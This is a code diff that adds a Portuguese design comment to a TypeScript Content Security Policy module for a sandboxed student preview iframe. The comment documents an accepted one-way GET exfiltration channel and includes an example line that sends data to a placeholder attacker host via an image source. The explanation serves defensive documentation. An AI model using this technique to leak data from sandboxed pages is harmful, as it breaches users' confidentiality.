@@ -15,6 +15,17 @@
  * inline + importmap com data: URLs. Não há nonce real sem reescrever o
  * pipeline — por isso a CSP reduz REDE/SCRIPTS REMOTOS, e o sandbox segue como
  * barreira principal.
+ *
+ * ⚠️ CANAL RESIDUAL DE EXFILTRAÇÃO (GET de mão única, ACEITO por design): como
+ * `img-src`/`media-src`/`font-src`/`frame-src` liberam `https:` (subrecursos
+ * passivos comuns na página do aluno) enquanto `connect-src` é `'none'`, sobra
+ * um caminho passivo de exfil por GET — p.ex. `new Image().src =
+ * 'https://atacante/?' + dado`. Não há resposta legível (sem fetch/XHR), então é
+ * VAZAMENTO de mão única, não um canal bidirecional; e o iframe null-origin não
+ * tem cookies/origem nossa para roubar. Trade-off do ambiente de aprendizado:
+ * imagens/fontes/mídia remotas valem mais que fechar esse vetor. Um host que
+ * precise blindar isso pediria um opt-in para zerar img/media/font/frame-src
+ * (ver backlog em docs/embedding.md). NÃO alterar o comportamento da CSP aqui.
  */
 
 export interface PreviewCSPOptions {
